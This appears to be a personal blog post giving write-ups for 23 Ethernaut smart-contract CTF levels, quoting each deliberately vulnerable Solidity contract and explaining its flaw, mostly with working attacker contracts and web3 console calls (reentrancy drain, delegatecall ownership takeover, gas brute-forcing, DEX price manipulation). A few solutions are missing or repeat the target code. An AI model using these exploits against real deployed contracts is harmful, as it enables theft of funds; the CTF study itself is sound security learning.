---
layout: post
title: "Ethernaut CTF WriteUps "
date: 2023-01-20 10:07:12
categories: blog
---

My first Blockchain CTF WriteUps

<!--more-->

## 1 Fallback

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import '@openzeppelin/contracts/math/SafeMath.sol';
contract Fallback {
  using SafeMath for uint256;
  mapping(address => uint) public contributions;
  address payable public owner;
  constructor() public {
	owner = msg.sender;
	contributions[msg.sender] = 1000 * (1 ether);
  }
  modifier onlyOwner {
		require(
			msg.sender == owner,
			"caller is not the owner"
		);
		_;
	}
  function contribute() public payable {
	require(msg.value < 0.001 ether);
	contributions[msg.sender] += msg.value;
	if(contributions[msg.sender] > contributions[owner]) {
	  owner = msg.sender;
	}
  }
  function getContribution() public view returns (uint) {
	return contributions[msg.sender];
  }
  function withdraw() public onlyOwner {
	owner.transfer(address(this).balance);
  }
  receive() external payable {
	require(msg.value > 0 && contributions[msg.sender] > 0);
	owner = msg.sender;
  }
}
```

To solve this level we need to become contract owner and transfer all the funds of the contract.

We have a fallback function here,

```solidity
receive() external payable {
	require(msg.value > 0 && contributions[msg.sender] > 0);
	owner = msg.sender;
 }
```

> A fallback function is called every time a contract receives ether or an unknown method is called.
> So by sending some ether to the contract we can trigger the fallback function but there's a condition

```
 require(msg.value > 0 && contributions[msg.sender] > 0);
```

-   So first call the contribute function with less than 0.001 ether, that will add a contribution for msg.sende.

-   Now send some ether to the contract this will trigger fallback and make you owner of the contract.

-   Finally call the withdraw function to transfer all the funds from the contract.

---

## 2 Fallout

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import '@openzeppelin/contracts/math/SafeMath.sol';
contract Fallout {

  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;
  /* constructor */
  function Fal1out() public payable {
	owner = msg.sender;
	allocations[owner] = msg.value;
  }
  modifier onlyOwner {
			require(
				msg.sender == owner,
				"caller is not the owner"
			);
			_;
		}
  function allocate() public payable {
	allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }
  function sendAllocation(address payable allocator) public {
	require(allocations[allocator] > 0);
	allocator.transfer(allocations[allocator]);
  }
  function collectAllocations() public onlyOwner {
	msg.sender.transfer(address(this).balance);
  }
  function allocatorBalance(address allocator) public view returns (uint) {
	return allocations[allocator];
  }
}
```

To solve this challenge you need to become the owner of the contract.

```js
 function Fal1out() public payable {
	owner = msg.sender;
	allocations[owner] = msg.value;
  }
```

-   As you can see the letter l is changed to 1 so it's not a constructor .
-   We can call this function and claim the ownership

---

## 3 Coin Flip

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import '@openzeppelin/contracts/math/SafeMath.sol';
contract CoinFlip {
  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  constructor() public {
	consecutiveWins = 0;
  }
  function flip(bool _guess) public returns (bool) {
	uint256 blockValue = uint256(blockhash(block.number.sub(1)));
	if (lastHash == blockValue) {
	  revert();
	}
	lastHash = blockValue;
	uint256 coinFlip = blockValue.div(FACTOR);
	bool side = coinFlip == 1 ? true : false;
	if (side == _guess) {
	  consecutiveWins++;
	  return true;
	} else {
	  consecutiveWins = 0;
	  return false;
	}
  }
}
```

To solve this challenge you need to guess the coinflip outcome consecutively for 10 times .

If you see the flip function there's a condition that checks for blockhash.

The blockhash is a function which returns the hash of the block number in bytes32.

And the blockvalue is comparing to the lasthash .

-   For this we need to create a another contract and inherit this contract in it .
-   Now if we call the the function flip from the another contract the blockhash will be same , then the side value will be same ,so we can call the flip function from challange contract with that value .

-   Call this function 10 times individually other wise the function call will occur in same block and the blockvalue and lasthash will be equal.

---

## 4 Telephone

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
contract Telephone {
  address public owner;
  constructor() public {
	owner = msg.sender;
  }
  function changeOwner(address _owner) public {
	if (tx.origin != msg.sender) {
	  owner = _owner;
	}
  }
}
```

To solve this challenge we need to claim the ownership of the contract.

There is a changeowner function that will change the owner with a check.

The check ` if (tx.origin != msg.sender)`
tx.origin gives the address of the account that initiates the first transaction.

msg.sender gives the address of the immediate transaction address.

To solve this we need a external contract , so we can initiate the function call which is tx.origin and in contract we call the function to call the changeowner function in original contract.
And the contract address will be msg.sender

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.6.0;
contract Telephone {
  address public owner;
  constructor() public {
	owner = msg.sender;
  }
  function changeOwner(address _owner) public {
	if (tx.origin != msg.sender) {
	  owner = _owner;
	}
  }
}
```

-   It passes the check and We get the ownership.

---

## 5 Token

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
contract Token {
  mapping(address => uint) balances;
  uint public totalSupply;
  constructor(uint _initialSupply) public {
	balances[msg.sender] = totalSupply = _initialSupply;
  }
  function transfer(address _to, uint _value) public returns (bool) {
	require(balances[msg.sender] - _value >= 0);
	balances[msg.sender] -= _value;
	balances[_to] += _value;
	return true;
  }
  function balanceOf(address _owner) public view returns (uint balance) {
	return balances[_owner];
  }
}
```

We given a simple token contract , to solve this challange we need to get extra amount of tokens than we have.

`balances[msg.sender] - _value >= 0`

There's a underflow condition in the transfer function.

-   If we subtract a larger number from smaller one we will get a very large number.

-   We given 20 tokens, so call transfer function with any valid address and a number greater than 20.

## 6 Delegation

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
contract Delegate {
  address public owner;
  constructor(address _owner) public {
	owner = _owner;
  }
  function pwn() public {
	owner = msg.sender;
  }
}
contract Delegation {
  address public owner;
  Delegate delegate;
  constructor(address _delegateAddress) public {
	delegate = Delegate(_delegateAddress);
	owner = msg.sender;
  }
  fallback() external {
	(bool result,) = address(delegate).delegatecall(msg.data);
	if (result) {
	  this;
	}
  }
}
```

To solve the challange you need to become owner of the contract .

We have Deligation contract which uses Delegate contract .

First we see what is deligate call.

`In simple if there are 2 contracts A and B , A deligatecalls B contract , we are executing the code of contract B with the storage of A`

So we have a fallback function here which takes msg.data as input.

As you can see there's a function called pwn in Deligate contract which sets the owner variable.

So if we call that function by using Deligatecall we can modify the owner variable in the Deligation contract.

To call the function we can send the first 4 bytes of keccak hash of the function name in the data field which calls the function.

First calculate the hash of the pwn() function

```js
web3.utils.sha3("pwn()");
```

Then send transaction to the Deligation contract with data field set to that hash.

```js
await sendTransaction({ from: player, to: instance, data: "0xdd365b8b" });
```

---

## 7 Force

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
contract Force {/*
                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)
*/}
```

We have given a empty contract , the goal of this challenge is to make balance greater than 0 of this contract.

To send balance to the contract there is no payable function in this contract .

In solidity there's a special function that sends balance forcefully ,that is selfdestruct().

selfdestruct () is used to erase the contract .

When the contract calls selfdestruct() function with an address parameter , the balance of the contract will transfer to the address .

So we can simply create a new contract and send some balance to the contract and then call selfdestruct (challange contract address) .

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
contract Force {
    function receiveEther() payable public{
     }
    function send(address payable _add) public {
        selfdestruct(_add);
    }
}
```

## 8 Vault

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
contract Vault {
  bool public locked;
  bytes32 private password;
  constructor(bytes32 _password) public {
    locked = true;
    password = _password;
  }
  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```

To solve this challenge we need to call the unlock with correct password.

As you can see the password is stored in the contract itself with visibility private.

In blockchain everything is public , so do the password too . The private only limits it by using in other derived contracts.

We can read the contract storage using web3js .

```js
await contract.unlock(await web3.eth.getStorageAt(instance, 1));
```

## 9 King

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
contract King {
  address payable king;
  uint public prize;
  address payable public owner;
  constructor() public payable {
    owner = msg.sender;
    king = msg.sender;
    prize = msg.value;
  }
  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }
  function _king() public view returns (address payable) {
    return king;
  }
}
```

To solve this challenge we need to become the king at the end of the submission .

There's a fallback function that makes a user as king if the msg.value greater than or equals to the prize value .So anyone can become king but we need to stop the others.

First we send ether more than prize and become king.

Next we need to stop the king.transfer() function to stop others to become king after the submission.

```solidity
contract Kinghack {

    constructor(address _add) payable {
        _add.call{value:1000000000000001}("");
    }
    receive() external payable {
        require(1==2);
    }
}
```

## 10 Re-entrancy

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import '@openzeppelin/contracts/math/SafeMath.sol';
contract Reentrance {

  using SafeMath for uint256;
  mapping(address => uint) public balances;
  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }
  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }
  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }
  receive() external payable {}
}
```

To solve this challenge we need to steal all the funds from the contract.

In withdraw function , the contract is sending amount via call method, instead of send or transfer which introduces reentrancy bug.

If msg.sender is a contract and calling the withdraw function , then the withdraw function makes a call to the msg.sender contract which triggers a function that calls the withdraw function again recursively .

So first we depoist some amount in the contract and call the withdraw function from the attacker contract, the balance is updated after the call so we can steal the funds .

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
interface Re {
  function donate(address _to) external payable;
  function withdraw(uint _amount) external;
}
contract Reentrance {
    Re reentrace;
    constructor(address _add) payable public {
        reentrace = Re(_add);
        reentrace.donate{value: msg.value}(address(this));
    }
    function startAttack() payable public {
        reentrace.withdraw(0.001 ether);
    }
    fallback() external payable {
        reentrace.withdraw(0.001 ether);
    }
}
```

## 11 Elevator

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
interface Building {
  function isLastFloor(uint) external returns (bool);
}
contract Elevator {
  bool public top;
  uint public floor;
  function goTo(uint _floor) public {
    Building building = Building(msg.sender);
    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

To solve this challenge ,we need to make the top as true.

The contract inherting a Building contract which has a isLastFloor function (which is also the msg.sender).

The isLastFloor function should return true in first call and false in second call so that we can make top as true.

```solidity

```

## 12 Privacy

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
contract Privacy {
  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(now);
  bytes32[3] private data;
  constructor(bytes32[3] memory _data) public {
    data = _data;
  }

  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }
  /*
    A bunch of super advanced solidity algorithms...
      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}
```

To solve this challenge , need to call the unlock function with bytes16 `_key`.

This is similar to the [Vault](#8-vault) , the key is stored at the data[2].

The data is bytes32[] array and the storage slots are 3, 4 , 5 respectively , for the data[2] it is stored in slot 5.

But it is a bytes32 value , the key is bytes16 , so to convert bytes32 to bytes16 we remove the last 32 bytes from the bytes32 .

```js
await contract.unlock(
	(await web3.eth.getStorageAt(contract.address, 5)).substr(0, 34)
);
```

## 13 Gatekeeper One

```solidity
Code
```

To solve this challenge , we need to pass the all the checks in three gates.

gateOne:

-   We can pass this check by calling the contract from another contract not an EOA

gateTwo:

-   To pass this check , the gasLeft at the gateTwo should be divisible by 8191 .
-   We can control the gas of a function call using `call` so we can bruteforce the gas
-   We can also use remix debugger to check the gasleft at the specific Opcode.

gateThree:
There are 3 checks to pass this check .

-   The value of uint32 is equal to uint16 , it means the last 32 bytes should equal to last 16 bytes . 0x00001234 is equal to 0x1234
-   The value of uint32 is not equal to uint64 ,to do so we can change the 0 to something other than that 0x1111111100001234 is not equal to 0x0000000000001234.
-   The value of last 32 bits is equal to value of last 16 bits of the tx.origin. We can pass this check by sending the last 2 bytes of the address as the last 2 bytes.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract gatekeeper {
  function attack(address _add) public {
      bytes8 key = 0x100000000000D120;
      for (uint i = 0; i < 8191; i++) {
            (bool x, ) = _add.call{gas:25000+i}(abi.encodeWithSignature("enter(bytes8)", key));
            if (x) {
                break;
            }
        }
  }
}
```

## 14 GateKeeper Two

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
contract GatekeeperTwo {
  address public entrant;
  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }
  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }
  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }
  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

To solve this challenge we need to pass three gates .

gateOne:

-   This check can be passed by sendind the transcation from a contract and not EOA

gateTwo:

-   This checks if the msg.sender code size is 0 or not .
-   We can call it from constructor because at the time of calling the code size will be 0 , the runtime code not yet loaded to the address till execution of constructor .

gateThree:

-   To pass this check we need to provide a gateKey which can obtained by doing XOR .

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract gate2 {
    constructor(address _add) {
        uint64 key = uint64(bytes8(keccak256(abi.encodePacked(this))) ^ 0xffffffffffffffff);
        _add.call(abi.encodeWithSignature("enter(bytes8)", bytes8(key)));
    }
}
```

## 15 Naught Coin

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
 contract NaughtCoin is ERC20 {
  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = now + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;
  constructor(address _player)
  ERC20('NaughtCoin', '0x0')
  public {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }

  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }
  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(now > timeLock);
      _;
    } else {
     _;
    }
  }
}
```

To solve the challenge we need to send the tokens from our accont to others , and our balance should be 0.

We can't doirectly transfer , because of the `lockTokens` check.

Here we are inherting the ERC20 token , in ERC20 token we have other functions like transfer to tranfer tokens.

First we need to allow other address to send tokens behalf of our account by `approve` method.

And then use `transferFrom` to send the tokens from the approved account.

I approved myself as a other account here.

```js
var f = await contract.balanceOf(player);
await contract.approve(player, f);
await contract.transferFrom(
	player,
	"0x4FB63736C20ea6cFa8FfEFab75A728D5f4A853D8",
	f
);
```

## 16 Preservation

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Preservation {
  // public library contracts
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner;
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));
  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress;
    timeZone2Library = _timeZone2LibraryAddress;
    owner = msg.sender;
  }

  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}
// Simple library contract to set the time
contract LibraryContract {
  // stores a timestamp
  uint storedTime;
  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```

To solve this challenge , we need to claim the ownership of the contract.

As we can see , there is a delegatecall in the setFirstTime function , the Sample library contract is also there.

The first slot in the Library Contract is a storedTime when A contract delegatecalls another contract , the another contract logic will executed and the storage of the contract which called modifies,Here when we set the timeStamp it actually stores in the timeZone1Library address variable.

So we can set the LibraryContract address by using setFirstTime function by passing our attacker contract address.

In attacker contract the variables should be like in the same order of the Perservation contract.

We create a function called seTime in attacker contract and update the owner varible from it . Then it changes the owner of the Perservation Contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
contract PreservationAttack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    function setTime(uint _time) public {
        owner = address(_time);
    }
}

```

```js
await contract.setFirstTime("PreservationAttack Address");
await contract.setFirstTime(player);
```

## 17 Recovery

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Recovery {
  //generate tokens
  function generateToken(string memory _name, uint256 _initialSupply) public {
    new SimpleToken(_name, msg.sender, _initialSupply);

  }
}
contract SimpleToken {
  string public name;
  mapping (address => uint) public balances;
  // constructor
  constructor(string memory _name, address _creator, uint256 _initialSupply) {
    name = _name;
    balances[_creator] = _initialSupply;
  }
  // collect ether in return for tokens
  receive() external payable {
    balances[msg.sender] = msg.value * 10;
  }
  // allow transfers of tokens
  function transfer(address _to, uint _amount) public {
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] = balances[msg.sender] - _amount;
    balances[_to] = _amount;
  }
  // clean up after ourselves
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}
```

To solve this challenge we need to recover the lost contract address.

We can calculate the address of a contract using two inputs one is sender address and another one is nonce.

We have the sender address that is Recovery contract .

The nonce will incremented before calculating the address as it is the first contract that Recovery contract created the nonce is 1.

I found this python code to calculate the address using Sender and Nonce .

```python
import rlp
from eth_utils import keccak, to_checksum_address, to_bytes
def mk_contract_address(sender: str, nonce: int) -> str:
    sender_bytes = to_bytes(hexstr=sender)
    raw = rlp.encode([sender_bytes, nonce])
    h = keccak(raw)
    address_bytes = h[12:]
    return to_checksum_address(address_bytes)
print(to_checksum_address(mk_contract_address(to_checksum_address("0xc3EC367bBA66b285Be6bA770992F11eF81D555ce"), 1)))
```

I got the contract address , check the balance to confirm .

To remove the balance from the contract call the destroy function in the contract .

Calling destroy function removes the balance from the contract.

```js
let contract_address = "0xe67204Ff8C8236bfAf22d42Eb160c713bad456Cc";
let functionSignature =
	web3.eth.abi.encodeFunctionSignature("destroy(address)");
let functionParam = web3.eth.abi.encodeParameter("address", player).slice(2);
await web3.eth.sendTransaction({
	from: player,
	to: contract_address,
	data: functionSignature + functionParam,
});
```

## 18 Magic Number

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract MagicNum {
  address public solver;
  constructor() {}
  function setSolver(address _solver) public {
    solver = _solver;
  }
  /*
    ____________/\\\_______/\\\\\\\\\_____
     __________/\\\\\_____/\\\///////\\\___
      ________/\\\/\\\____\///______\//\\\__
       ______/\\\/\/\\\______________/\\\/___
        ____/\\\/__\/\\\___________/\\\//_____
         __/\\\\\\\\\\\\\\\\_____/\\\//________
          _\///////////\\\//____/\\\/___________
           ___________\/\\\_____/\\\\\\\\\\\\\\\_
            ___________\///_____\///////////////__
  */
}
```

To solve this challenge we need to pass a contract address that should return 42 whenever it is called regardless of the function name.

To return a value from the stack we need to first store it .

To store value we can use `MSTORE` opcode which takes `MSTORE(position,value)` .

After that we return the Value using `RETURN` opcode `RETURN(starting_position,length)`.

```asm
PUSH1 0x2A
PUSH1 0x60
MSTORE
PUSH1 0x20
PUSH1 0x60
RETURN
```

By replacing opcodes with Hex values . `602a60605260206060f3`.

This is the runtime code . But to put this in blockchain we need Initialization code or creation code which returns the runtime code .

To do that we use CODECOPY opcode which takes three arguments: target memory position to copy the code to, instruction number to copy from, and number of bytes of code to copy.

The runtime code will start after the creation code . So the length of the creation code is the starting position for the runtime code .

The creation code :

```asm
PUSH1 0x0a
PUSH1 0x0c
PUSH1 0x0
CODECOPY
PUSH1 0x0a
PUSH1 0x0
RETURN
```

The result hex code is `600a600c600039600a6000f3`.

The total contract code is `600a600c600039600a6000f3602a60605260206060f3`.

To deploy this we need to send a transcation .

```js
var tx = await web3.eth.sendTransaction({
	from: player,
	data: "0x600a600c600039600a6000f3602a60605260206060f3",
});
await contract.setSolver(tx.contractAddress);
```

## 19 Alien Codex

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;
import '../helpers/Ownable-05.sol';
contract AlienCodex is Ownable {
  bool public contact;
  bytes32[] public codex;
  modifier contacted() {
    assert(contact);
    _;
  }

  function make_contact() public {
    contact = true;
  }
  function record(bytes32 _content) contacted public {
    codex.push(_content);
  }
  function retract() contacted public {
    codex.length--;
  }
  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}
```

To solve this challenge we need to claim the ownership of the contract.

The contract inherting the ownable contract which have the owner variable. So it will come in slot 0 in our contract.

First we need call the `retract` function o change the length of the codex . Because of the underflow of the codex size becomes `2 ** 256`.

To call retract we need to call `make_contact` first.

```js
await contract.make_contact();
await contract.retract();
await web3.eth.getStorageAt(instance, 1);
//'0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
```

So that we can write at any index of the codex which is the overall storage of the contract.

We need to calculate the slot of the codex[0] which is the place owner variable is stored . We need to find the index and pass it to `revise` function to claim the ownership.

The length of the array is stored at slot - 1 . The array will start at `keccka256(slot-1) + index ` (index = 0) .

```js
index = await web3.utils.encodePacked(
	web3.utils
		.toBN("0x1" + "0".repeat(64))
		.sub(web3.utils.toBN(web3.utils.keccak256("0x" + "0".repeat(63) + "1")))
);
await contract.revise(index, "0x" + player.slice(2).padStart(64, "0"));
```

## 20 Denial

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances
    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }
    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] +=  amountToSend;
    }
    // allow deposit of funds
    receive() external payable {}
    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

To solve this challenge we need to deny the owner from withdrawing the funds . This looks like [King](#9-king) but this is different because king challenge used transfer that reverts a transacion and throws error. Call only return boolean values.

But it is not relying on the return value of the ` partner.call{value:amountToSend}("");` to transfer the funds to the owner.

If we revert our contract which we pass it as partner , the owner still gets funds.

We can use assert in our contract which won't refund any gas and fails the transaction .

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
contract Denial {
    fallback() external payable {
        assert(false);
    }
}
```

```js
await contract.setWithdrawPartner(Address of Above contract)
```

## 21 Shop

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface Buyer {
  function price() external view returns (uint);
}
contract Shop {
  uint public price = 100;
  bool public isSold;
  function buy() public {
    Buyer _buyer = Buyer(msg.sender);
    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
```

To solve this challenge we need to buy the item for less price than the price in contract.

First we need to create a Buyer contract and we need to call `buy()` from the Buyer contract.

The Buyer contract should return a number that is greater than 100 in first call (`if (_buyer.price() >= price && !isSold) `) and less than 100 in next call in ` price = _buyer.price();`

We can't use any contract storage because the function state is `view` .

But we can use the storage of the Shop contract to return 2 different values for 1st and 2nd call .

Here is the exploit :

```solidity
contract ShopAttack {
    Shop shopcon;
    constructor(address _add) public {
        shopcon = Shop(_add);

    }
    function buyy() public {
        shopcon.buy();
    }
    function price() external view returns (uint) {
        if (shopcon.isSold()){
            return 50;
        }else {
            return 101;
        }
    }
}
```

## 22 Dex

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import 'openzeppelin-contracts-08/access/Ownable.sol';
contract Dex is Ownable {
  address public token1;
  address public token2;
  constructor() {}
  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }

  function addLiquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }

  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }
  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }
  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(msg.sender, spender, amount);
    SwappableToken(token2).approve(msg.sender, spender, amount);
  }
  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}
contract SwappableToken is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }
  function approve(address owner, address spender, uint256 amount) public {
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}
```

To solve this level we need to drain any one of the token1 or token2 from the contract .

Initially the player has 10 of each tokens and contract has a 100 of each tokens.

If we swap our 10 tokens of token1 with 10 tokens of token2 we get 20 tokens of token2 and 0 of token1 and the contract has 110,90 of token1 and token2 respectively.

if we calculate the `getSwapPrice` for 20 tokens of token2 , we get 24.

Like this we can get more tokens with the getSwapPrice function for every Swap .

```js
let t1 = await contract.token1();
let t2 = await contract.token2();
await contract.swap(t1,t2,24);
await contract.swap(t2,t1,30);
await contract.swap(t1,t2,41);
After this we get 65 tokens of token2 , the getSwapPrice is 158 , the contract have only 110 if we swap 45 tokens of token2 we get the 110 tokens of token1.
await contract.swap(t2,t1,45);
After this the tokens of token1 in the contract becomes 0.
```

## 23 Dex Two

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import 'openzeppelin-contracts-08/access/Ownable.sol';
contract DexTwo is Ownable {
  address public token1;
  address public token2;
  constructor() {}
  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }
  function add_liquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }

  function swap(address from, address to, uint amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapAmount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }
  function getSwapAmount(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }
  function approve(address spender, uint amount) public {
    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
  }
  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}
contract SwappableTokenTwo is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }
  function approve(address owner, address spender, uint256 amount) public {
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}
```

To solve this level we need to drain all the tokens of token1 and token2 in the contract.

We can drain one token from the contract by that method in previous challenge.

After that we left with 90 token2 in contract . We need to drain them , As you can see there is no from and to token check here , so we can pass any contract address that has a function of balanceOf and returns a integer greater than 1 .

I used this contract .

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract DexTwo {
     function balanceOf(address token) external view returns (uint){
        return 1;
    }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        return true;
    }
}
```

Which sets the getSwapAmount to 90 when we pass amount as 1. ( 1 \* 90 /1) . Now we can swap with this contract address , token2 address , amount as 1.

```js
await contract.swap(attack, t2, 1);
```
